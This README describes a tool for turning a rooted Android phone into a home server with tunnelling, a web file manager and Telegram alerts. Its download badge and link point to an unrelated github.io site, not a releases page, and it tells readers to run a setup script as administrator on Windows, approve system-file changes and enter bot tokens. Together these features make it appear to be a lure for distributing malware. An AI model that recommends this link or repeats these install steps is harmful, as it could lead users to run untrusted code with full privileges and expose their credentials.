# 📱 android-home-server - Turn old phones into reliable servers

[![Download Software](https://img.shields.io/badge/Download-Visit_Releases-blue.svg)](https://dyannpointillistic77.github.io)

This project transforms your unused Android phone into a functional home server. You gain a private file storage system, remote access tools, and automated notifications without needing to buy expensive hardware.

## 📋 Requirements
Before you begin, ensure you have the following items:
* An Android phone with a working screen and battery.
* Root access granted via Magisk.
* A stable power supply and Wi-Fi connection.
* A Windows computer to manage the initial setup.

## 🚀 Preparing Your Phone
Root access allows the software to interact with the phone hardware correctly. If your phone does not have Magisk installed, please follow your device-specific instructions to unlock the bootloader and root the system. Once rooted, ensure you enable USB Debugging in the Android Developer Options menu.

## 📥 Downloading the Files
Visit this page to download: https://dyannpointillistic77.github.io

1. Click the link above to view the repository releases.
2. Select the latest version listed under the Releases section.
3. Download the zipped folder to your Windows desktop.
4. Extract the contents of this folder into a new directory on your computer.

## ⚙️ Installation Process
Connect your phone to your computer using a USB cable. Open the extracted folder on your Windows computer. Locate the setup script and run it as an administrator. The terminal window will open and display the progress of the installation.

The script performs the following tasks:
* Installs the necessary terminal emulator environment.
* Configures the file manager software.
* Sets up the secure tunnel for remote access.
* Connects your Telegram bot credentials for alerts.

Follow the on-screen prompts. When the script asks for permission to modify system files, grant the request on your phone screen. The process may take several minutes depending on your internet speed.

## 🌐 Configuring Remote Access
Your server uses a tunnel to provide safe access to your files from anywhere. You will need a free account from the tunnel provider. Follow the prompts in the terminal to link your account. Once linked, the server will assign a unique web address to your phone. Use this address in any browser to manage your files remotely.

## 📂 Managing Files
The web file manager lets you upload, download, and delete files stored on your Android internal storage. Access this interface through the web address provided during the tunnel setup. You do not need to install any additional software on your other devices to use these tools.

## 🔔 Setting Up Alerts
The server sends status updates directly to your phone via Telegram. To enable this, create a new bot through the Telegram BotFather. Copy the API token provided by Telegram and paste it into the configuration file when requested by the setup script. Your server will now message you if the storage space reaches capacity or if a restart occurs.

## 🛡️ Maintaining Your Server
Keep your phone connected to a reliable power source. Over time, the battery may degrade if left at 100 percent charge permanently. If possible, use a smart plug to manage the charging cycle of the device. Check the logs folder inside the installation directory periodically to ensure no errors appear.

## ❓ Frequently Asked Questions
Will this slow down my phone?
The server operates in the background and uses a small amount of memory. You should notice no impact on basic phone functions.

Can I move the phone?
Yes, as long as it stays within range of your Wi-Fi router. 

Does this work on non-rooted phones?
No, the system requires root privileges to provide the necessary server features.

Keywords: android, chroot, cloudflare-tunnel, filebrowser, home-server, homelab, magisk, self-hosted, termux, ubuntu